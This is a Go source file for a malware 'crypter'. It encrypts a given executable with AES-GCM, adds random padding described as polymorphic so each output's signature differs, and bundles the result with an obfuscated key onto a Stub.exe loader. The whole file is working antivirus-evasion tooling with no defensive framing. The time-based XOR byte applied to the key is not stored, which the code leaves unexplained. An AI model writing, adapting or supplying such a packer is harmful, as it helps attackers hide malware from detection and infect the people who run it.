package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"time"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: crypter.exe <input.exe> <output.exe>")
		os.Exit(1)
	}

	inputFile := os.Args[1]
	outputFile := os.Args[2]

	// Read the original executable
	plaintext, err := os.ReadFile(inputFile)
	if err != nil {
		fmt.Printf("Failed to read input file: %v\n", err)
		os.Exit(1)
	}

	// Add polymorphic layers - changes binary signature on each build
	plaintext = addPolymorphicLayer(plaintext)

	// Generate random encryption key (unique per build)
	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		fmt.Printf("Failed to generate key: %v\n", err)
		os.Exit(1)
	}

	// Multi-layer XOR obfuscation with random keys
	obfuscatedKey := make([]byte, 32)
	xorKey := byte(time.Now().Unix() % 256)
	for i := range key {
		obfuscatedKey[i] = key[i] ^ 0x5A ^ xorKey // Double XOR with time-based key
	}

	// Encrypt the payload
	encrypted, err := encryptPayload(plaintext, key)
	if err != nil {
		fmt.Printf("Failed to encrypt: %v\n", err)
		os.Exit(1)
	}

	// Read the stub (loader)
	stub, err := os.ReadFile("Stub.exe")
	if err != nil {
		fmt.Printf("Failed to read stub: %v\n", err)
		fmt.Println("Make sure Stub.exe exists in the same directory")
		os.Exit(1)
	}

	// Create final packed binary: stub + marker + obfuscated key + encrypted payload
	marker := []byte{0x3C, 0x3C, 0x3C, 0x50, 0x41, 0x59, 0x4C, 0x4F, 0x41, 0x44, 0x5F, 0x53, 0x54, 0x41, 0x52, 0x54, 0x3E, 0x3E, 0x3E}
	keyMarker := []byte{0x3C, 0x3C, 0x3C, 0x4B, 0x45, 0x59, 0x3E, 0x3E, 0x3E}

	final := append(stub, marker...)
	final = append(final, keyMarker...)
	final = append(final, obfuscatedKey...)
	final = append(final, encrypted...)

	// Write packed executable
	err = os.WriteFile(outputFile, final, 0755)
	if err != nil {
		fmt.Printf("Failed to write output: %v\n", err)
		os.Exit(1)
	}

	hash := sha256.Sum256(final)
	fmt.Printf("[+] Packed successfully!\n")
	fmt.Printf("[+] Input size:  %d bytes\n", len(plaintext))
	fmt.Printf("[+] Output size: %d bytes\n", len(final))
	fmt.Printf("[+] Key: %s\n", hex.EncodeToString(key))
	fmt.Printf("[+] SHA256: %s\n", hex.EncodeToString(hash[:]))
	fmt.Printf("[+] Saved to: %s\n", outputFile)
}

func encryptPayload(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Generate nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Encrypt and prepend nonce
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// addPolymorphicLayer adds random junk code and entropy to change signature
func addPolymorphicLayer(data []byte) []byte {
	// Inject random entropy at the end (will be in .data section)
	entropy := make([]byte, 512+int(time.Now().Unix()%1024))
	rand.Read(entropy)

	// Append entropy to binary
	result := append(data, entropy...)

	// Add random padding to change file size signature
	padding := make([]byte, int(time.Now().Unix()%256))
	rand.Read(padding)
	result = append(result, padding...)

	return result
}
